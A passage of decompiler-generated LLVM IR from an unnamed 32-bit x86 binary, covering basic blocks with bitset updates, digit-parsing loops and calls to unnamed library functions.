  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_80530f9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805328e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_8052bc1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_80526d0()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp240, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp241, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554f0.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554f0.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
